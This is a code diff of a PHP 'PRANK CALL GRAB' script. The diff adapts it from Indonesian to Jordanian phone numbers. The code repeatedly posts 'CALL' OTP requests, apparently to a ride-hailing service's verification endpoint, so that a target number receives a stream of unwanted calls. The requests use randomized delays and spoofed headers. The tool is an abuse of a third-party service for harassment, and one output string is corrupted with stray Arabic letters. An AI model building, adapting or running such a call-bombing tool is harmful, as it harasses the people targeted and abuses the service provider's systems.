@@ -6,6 +6,7 @@ function get_input() {
 class PrankCall {
     private $number;
     private $headers = [];
+    private $valid_prefixes = ['079', '078', '077', '075']; // الخطوط المدعومة في الأردن
 
     public function __construct($no) {
         $this->number = $this->validate_number($no);
@@ -15,14 +16,25 @@ class PrankCall {
         // إزالة أي أحرف غير رقمية
         $no = preg_replace('/[^0-9+]/', '', $no);
 
-        // التحقق من وجود رمز الدولة (+)
+        // التحقق من الصيغة المحلية (بدون +962)
         if (substr($no, 0, 1) !== '+') {
-            die("Error: Please include the country code with a '+' sign (e.g., +62 for Indonesia).\n");
+            // التحقق من أن الرقم يبدأ بخط صالح
+            $prefix = substr($no, 0, 3);
+            if (!in_array($prefix, $this->valid_prefixes)) {
+                die("Error: Invalid Jordanian phone number. Supported prefixes are: " . implode(', ', $this->valid_prefixes) . ".\n");
+            }
+            // تحويل الرقم إلى الصيغة الدولية (+962)
+            $no = '+962' . substr($no, 1);
+        } else {
+            // التحقق من أن الرقم يبدأ بـ +962
+            if (substr($no, 0, 4) !== '+962') {
+                die("Error: Invalid country code. Please use +962 for Jordan.\n");
+            }
         }
 
-        // التحقق من صحة الرقم
-        if (strlen($no) < 8) {
-            die("Error: Invalid phone number.\n");
+        // التحقق من طول الرقم
+        if (strlen($no) < 12 || strlen($no) > 13) { // +96279XXXXXXX
+            die("Error: Invalid phone number length.\n");
         }
 
         return $no;
@@ -60,8 +72,8 @@ class PrankCall {
             CURLOPT_POST => true,
             CURLOPT_POSTFIELDS => http_build_query([
                 'method' => 'CALL',
-                'countryCode' => substr($this->number, 1, 2), // استخراج رمز الدولة
-                'phoneNumber' => substr($this->number, 3),    // استخراج الرقم بدون رمز الدولة
+                'countryCode' => 'JO', // رمز الدولة للأردن
+                'phoneNumber' => substr($this->number, 1), // الرقم بدون +
                 'templateID' => 'pax_android_production'
             ]),
             CURLOPT_HTTPHEADER => $this->generate_headers(),
@@ -86,7 +98,7 @@ class PrankCall {
             $success = $this->send_otp();
             $attempt++;
 
-            echo "[" . date('H:i:s') . "] Percobaan ke-$attempt: " . ($success ? 'Sukses (Panggilan berhasil dikirim!)' : 'Gagal (Tidak ada panggilan)') . PHP_EOL;
+            echo "[" . date('H:i:s') . "] Percobaan ke-$attempt: " . ($success ? 'Sukses (Panggilan berhasil dikirim!)' : 'Gagal (Tidak ada panggilان)') . PHP_EOL;
 
             if ($count != 0 && $attempt >= $count) break;
             sleep(rand(1, 3)); // تأخير بين المحاولات
@@ -97,7 +109,7 @@ class PrankCall {
 }
 
 echo "########## PRANK CALL GRAB ##########\n";
-echo "Nomor Target (contoh: +628123456789): ";
+echo "Nomor Target (contoh: +962791234567 atau 0791234567): ";
 $number = get_input();
 
 $prank = new PrankCall($number);
